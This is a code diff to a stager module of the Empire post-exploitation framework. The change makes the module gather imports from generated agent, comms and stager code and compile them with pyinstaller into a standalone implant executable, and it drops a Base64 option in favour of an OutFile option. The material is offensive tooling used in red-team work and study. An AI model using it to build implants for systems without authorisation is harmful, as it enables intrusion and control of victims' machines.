@@ -2,9 +2,8 @@ from __future__ import print_function
 
 import logging
 import os
+import time
 from builtins import object, str
-
-from empire.server.common import helpers
 
 """
 
@@ -72,17 +71,15 @@ class Stager(object):
                 "SuggestedValues": ["True", "False"],
                 "Strict": True,
             },
-            "Base64": {
-                "Description": "Switch. Base64 encode the output. Defaults to False.",
-                "Required": True,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
-            },
             "UserAgent": {
                 "Description": "User-agent string to use for the staging request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
+            },
+            "OutFile": {
+                "Description": "Filename that should be used for the generated output.",
+                "Required": True,
+                "Value": "Empire",
             },
         }
 
@@ -100,14 +97,10 @@ class Stager(object):
         # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
-        base64 = self.options["Base64"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
         safe_checks = self.options["SafeChecks"]["Value"]
         binary_file_str = self.options["BinaryFile"]["Value"]
-
         encode = False
-        if base64.lower() == "true":
-            encode = True
 
         import subprocess
 
@@ -129,27 +122,38 @@ class Stager(object):
                 log.error("Error in launcher command generation.")
                 return ""
             else:
-                files_to_extract_imports_from_list = []
-
-                stager_ffp_str = (
-                    self.mainMenu.installPath + "/data/agent/stagers/http.py"
+                active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
                 )
-                files_to_extract_imports_from_list.append(stager_ffp_str)
 
-                agent_ffp_str = self.mainMenu.installPath + "/data/agent/agent.py"
-                files_to_extract_imports_from_list.append(agent_ffp_str)
+                agent_code = active_listener.generate_agent(
+                    active_listener.options, language=language
+                )
+                comms_code = active_listener.generate_comms(
+                    active_listener.options, language=language
+                )
+
+                stager_code = active_listener.generate_stager(
+                    active_listener.options,
+                    language=language,
+                    encrypt=False,
+                    encode=False,
+                )
 
                 imports_list = []
-                for FullFilePath in files_to_extract_imports_from_list:
-                    with open(FullFilePath, "r") as file:
-                        for line in file:
-                            line = line.strip()
-                            if line.startswith("import "):
-                                helpers.color(line)
-                                imports_list.append(line)
-                            elif line.startswith("from "):
-                                helpers.color(line)
-                                imports_list.append(line)
+                for code in [agent_code, comms_code, stager_code]:
+                    for line in code.splitlines():
+                        line = line.strip()
+                        if line.startswith("from System"):
+                            # Skip Ironpython imports
+                            pass
+                        elif line.startswith("import sslzliboff"):
+                            # Sockschain checks to import this, so we will just skip it
+                            pass
+                        elif line.startswith("import "):
+                            imports_list.append(line)
+                        elif line.startswith("from "):
+                            imports_list.append(line)
 
                 imports_list.append("import trace")
                 imports_list.append("import json")
@@ -160,9 +164,7 @@ class Stager(object):
                 with open(binary_file_str + ".py", "w") as text_file:
                     text_file.write("%s" % launcher)
 
-                import time
-
-                output_str = subprocess.check_output(
+                output_str = subprocess.run(
                     [
                         "pyinstaller",
                         "-y",
@@ -177,4 +179,8 @@ class Stager(object):
                         binary_file_str + ".py",
                     ]
                 )
-        return launcher
+
+                with open(binary_file_str, "rb") as f:
+                    exe = f.read()
+
+                return exe
